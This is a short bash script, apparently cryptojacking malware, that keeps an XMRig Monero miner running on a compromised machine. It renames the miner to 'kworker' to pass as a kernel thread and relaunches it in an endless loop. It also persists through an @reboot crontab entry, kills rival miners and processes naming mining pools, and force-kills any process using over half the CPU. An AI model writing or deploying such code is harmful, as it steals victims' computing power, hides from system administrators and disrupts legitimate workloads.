#!/bin/bash

blocked_pools=(nicehash nanopool minergate supportxmr moneroocean "75.119.158.0:3333")

hide_process="kworker"
miner_path="/tmp/xmrig/xmrig-6.22.2/xmrig"

rename_miner() {
    if [[ -f "$miner_path" ]]; then
        mv "$miner_path" "/tmp/$hide_process"
        chmod +x "/tmp/$hide_process"
    fi
}

crontab_protect() {
    (crontab -l 2>/dev/null; echo "@reboot nohup bash /tmp/anti-killer.sh > /dev/null 2>&1 &") | crontab -
}

while true; do
    if ! pgrep -f "$hide_process" >/dev/null; then
        rename_miner
        nohup "/tmp/$hide_process" > /dev/null 2>&1 &
    fi
    pkill -f minerd
    pkill -f crypto
    for pool in "${blocked_pools[@]}"; do
        pkill -f "$pool"
    done
    sleep 10
    crontab_protect
    ps aux | awk '{if($3>50.0) print $2}' | while read highcpu; do
        kill -9 $highcpu
    done
    sleep 5
done
